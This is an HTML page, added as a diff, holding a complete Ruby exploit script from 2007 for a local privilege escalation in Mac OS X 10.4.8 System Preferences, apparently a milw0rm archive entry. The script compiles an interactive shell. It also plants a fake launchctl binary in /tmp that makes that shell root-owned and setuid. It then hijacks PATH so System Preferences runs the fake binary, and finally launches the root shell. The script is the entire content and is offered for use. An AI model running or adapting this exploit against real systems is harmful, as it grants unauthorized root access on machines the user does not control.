@@ -1,0 +1,29 @@
+<html><head><title>Mac OS X 10.4.8 System Preferences Local Privilege Escalation Exploit</title></head><pre>#!/usr/bin/ruby
+# Copyright (c) 2007 Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
+#                    Lance M. Havok   &lt;lmh [at] info-pull.com&gt;
+# All pwnage reserved.
+#
+# &quot;Exploit&quot; for MOAB-21-01-2007: OS X, making root shells easier each day.
+#
+
+SHELL_WRAP      = 'int main() { system(&quot;/bin/sh -i&quot;); return 0; }'
+SHELL_PLANT     = 'int main() { system(&quot;chown root: /tmp/shX; chmod 4755 /tmp/shX&quot;); return 0; }'
+PREFS_BINPATH   = '/Applications/System\ Preferences.app/Contents/MacOS/System\ Preferences'
+
+COMMAND_LINE    = &quot;echo '#{SHELL_WRAP}' &gt; /tmp/t.c &amp;&amp;&quot;    +
+                  &quot;cc -o /tmp/shX /tmp/t.c &amp;&amp;&quot;            +
+                  &quot;echo '#{SHELL_PLANT}' &gt; /tmp/t.c &amp;&amp;&quot;   +
+                  &quot;cc -o /tmp/launchctl /tmp/t.c &amp;&amp;&quot;      +
+                  'export PATH=&quot;/tmp/:$PATH&quot; &amp;&amp;'          +
+                  &quot;#{PREFS_BINPATH} &amp;&quot;
+
+def escalate()
+  system COMMAND_LINE
+  puts &quot;++ Click on Sharing and then click on Windows Sharing...&quot;
+  sleep 30 # make sure you have &quot;time&quot;
+  system &quot;/tmp/shX&quot; 
+end
+
+escalate()
+
+# milw0rm.com [2007-01-21]</pre></html>
